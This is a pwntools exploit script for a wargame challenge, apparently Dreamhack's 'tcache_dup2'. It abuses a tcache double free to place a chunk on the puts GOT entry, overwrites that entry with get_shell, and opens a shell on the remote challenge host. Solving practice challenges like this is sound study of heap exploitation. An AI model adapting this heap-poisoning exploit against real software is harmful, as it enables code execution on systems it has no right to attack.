from pwn import *
from pwn import p64
p = remote('host3.dreamhack.games', 17623)
e = ELF('./a/tcache_dup2')
 
def create(size, data):
    p.sendlineafter(b'> ', str(1).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)
 
def modify(idx, size, data):
    p.sendlineafter(b'> ', str(2).encode())
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)
 
def delete(idx):
    p.sendlineafter(b'> ', str(3).encode())
    p.sendlineafter(b'idx: ', str(idx).encode())
 
create(0x30, b'aaaa') #idx == 0
delete(0)
#tcache[0x40]: chunk A
 
modify(0, 0x10, b'a'*9)
delete(0)
#tcache[0x40]: chunk A -> chunk A
 
puts_got = e.got['puts']
modify(0, 0x10, p64(puts_got))
#tcache[0x40]: chunk A -> puts_got -> puts -> ...
 
create(0x30, b'bbbb') #idx == 1
#tcache[0x40]: puts_got -> puts
 
get_shell = e.symbols['get_shell']
create(0x30, p64(get_shell)) #chunk allocated at puts_got -> then, overwrite puts_got to get_shell() / idx == 2
 
p.interactive()